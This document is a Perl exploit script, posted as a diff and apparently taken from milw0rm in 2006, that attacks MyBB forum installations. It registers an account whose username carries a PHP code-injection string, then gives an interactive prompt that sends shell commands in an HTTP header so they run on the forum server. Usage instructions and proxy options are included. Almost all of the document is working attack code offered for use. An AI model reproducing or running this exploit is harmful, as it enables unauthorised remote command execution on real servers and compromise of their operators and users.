@@ -1,0 +1,206 @@
+#!/usr/bin/perl 
+# Tue Jun 13 12:37:12 CEST 2006 jolascoaga@514.es
+#
+# Exploit HOWTO - read this before flood my Inbox you bitch!
+#
+# - First you need to create the special user to do this use:
+#	./mybibi.pl --host=http://www.example.com --dir=/mybb -1
+#   this step needs a graphic confirmation so the exploit writes a file 
+#   in /tmp/file.png, you need to
+#   see this img and put the text into the prompt. If everything is ok, 
+#   you'll have a new valid user created.
+# * There is a file mybibi_out.html where the exploit writes the output 
+#   for debugging.
+# - After you have created the exploit or if you have a valid non common 
+#   user, you can execute shell commands.
+#
+# TIPS:
+# 	* Sometimes you have to change the thread Id, --tid is your friend ;)
+#	* Don't forget to change the email. You MUST activate the account.
+#	* Mejor karate aun dentro ti.
+#
+# LIMITATIONS:
+#	* If the admin have the username lenght < 28 this exploit doesn't works
+#
+# Greetz to !dSR ppl and unsec
+#
+# 514 still r0xing!
+
+# user config.
+my $uservar = "C"; # don't use large vars.
+my $password = "514r0x";
+my $email = "514\@mailinator.com";
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use LWP::Simple;
+use HTTP::Request::Common "POST";
+use HTTP::Response;
+use Getopt::Long;
+use strict;
+
+$| = 1;   # you can choose this or another one.
+
+my ($proxy,$proxy_user,$proxy_pass, $username);
+my ($host,$debug,$dir, $command, $del, $first_time, $tid);
+my ($logged, $tid) = (0, 2);
+
+$username = "'.system(getenv(HTTP_".$uservar.")).'";
+
+my $options = GetOptions (
+  'host=s'	      => \$host, 
+  'dir=s'	      => \$dir,
+  'proxy=s'           => \$proxy,
+  'proxy_user=s'      => \$proxy_user,
+  'proxy_pass=s'      => \$proxy_pass,
+  'debug'             => \$debug,
+  '1'		      => \$first_time,
+  'tid=s'	      => \$tid,
+  'delete'	      => \$del);
+
+&help unless ($host); # please don't try this at home.
+
+$dir = "/" unless($dir);
+print "$host - $dir\n";
+if ($host !~ /^http/) {
+	$host = "http://".$host;
+}
+
+LWP::Debug::level('+') if $debug;
+my ($res, $req);
+
+my $ua = new LWP::UserAgent(
+           cookie_jar=> { file => "$$.cookie" });
+$ua->agent("Mothilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!");
+$ua->proxy(['http'] => $proxy) if $proxy;
+$req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;
+
+create_user() if $first_time;
+
+while () {
+		login() if !$logged;
+
+		print "mybibi> "; # lost connection
+		while(<STDIN>) {
+				$command=$_;
+				chomp($command);
+				last;
+		}
+		&send($command);
+}
+
+sub send  {
+	chomp (my $cmd = shift);
+	my $h = $host.$dir."/newthread.php";
+	my $req = POST $h, [
+		'subject' => '514',
+		'message' => '/slap 514',
+		'previewpost' => 'Preview Post',
+		'action' => 'do_newthread',
+		'fid' => $tid,
+		'posthash' => 'e0561b22fe5fdf3526eabdbddb221caa'
+	];
+	$req->header($uservar => $cmd);
+	print $req->as_string() if $debug;
+	my $res = $ua->request($req);
+	if ($res->content =~ /You may not post in this/) {
+		print "[!] don't have perms to post. Change the Forum ID\n";
+	} else {
+		my ($data) = $res->content =~ m/(.*?)\<\!DOCT/is;
+		print $data;
+	}
+
+}
+sub login {
+	my $h  = $host.$dir."/member.php";
+	my $req = POST $h,[
+		'username' => $username,
+		'password' => $password,
+		'submit' => 'Login',
+		'action' => 'do_login'
+	];
+	my $res = $ua->request($req);
+	if ($res->content =~ /You have successfully been logged/is) {
+		print "[*] Login succesful!\n";
+		$logged = 1;
+	} else {
+		print "[!] Error login-in\n";
+	}
+}
+
+sub help {
+    print "Syntax: ./$0 --host=url --dir=/mybb [options] -1 --tid=2\n";
+    print "\t--proxy (http), --proxy_user, --proxy_pass\n";
+    print "\t--debug\n";
+    print "the default directory is /\n";
+    print "\nExample\n";
+    print "bash# $0 --host=http(s)://www.server.com/\n";
+    print "\n";
+    exit(1);
+}
+
+sub create_user {
+	# firs we need to get the img.
+	my  $h = $host.$dir."/member.php";
+	print "Host: $h\n";
+
+	$req = HTTP::Request->new (GET => $h."?action=register");
+	$res = $ua->request ($req);
+
+	my $req = POST $h, [
+		'action' => "register",
+		'agree' => "I Agree"
+	];
+	print $req->as_string() if $debug;
+	$res = $ua->request($req);
+
+	my $content = $res->content();
+	$content =~ m/.*(image\.php\?action.*?)\".*/is;
+	my $img = $1;
+	my $req = HTTP::Request->new (GET => $host.$dir."/".$img);
+	$res = $ua->request ($req);
+	print $req->as_string();
+
+	if ($res->content) {
+		open (TMP, ">/tmp/file.png") or die($!);
+		print TMP $res->content;
+		close (TMP);
+		print "[*] /tmp/file.png created.\n";
+	}
+
+	my ($hash) = $img =~ m/hash=(.*?)$/;
+	my $img_str = get_img_str();
+	unlink ("/tmp/file.png");
+	$img_str =~ s/\n//g;
+	my $req = POST $h, [
+		'username' => $username,
+		'password' => $password,
+		'password2' => $password,
+		'email' => $email,
+		'email2' => $email,
+		'imagestring' => $img_str,
+		'imagehash' => $hash,
+		'allownotices' => 'yes',
+		'receivepms' => 'yes',
+		'pmpopup' => 'no',
+		'action' => "do_register",
+		'regsubmit' => "Submit Registration"
+	];
+	$res = $ua->request($req);
+	print $req->as_string() if $debug;
+
+	open (OUT, ">mybibi_out.html");
+	print OUT $res->content;
+
+	print "Check $email for confirmation or mybibi_out.html if there are some error\n";
+}
+
+sub get_img_str ()
+{
+	print "\nNow I need the text shown in /tmp/file.png: ";
+	my $str = <STDIN>;
+	return $str;
+}
+exit 0;
+
+# milw0rm.com [2006-06-13]
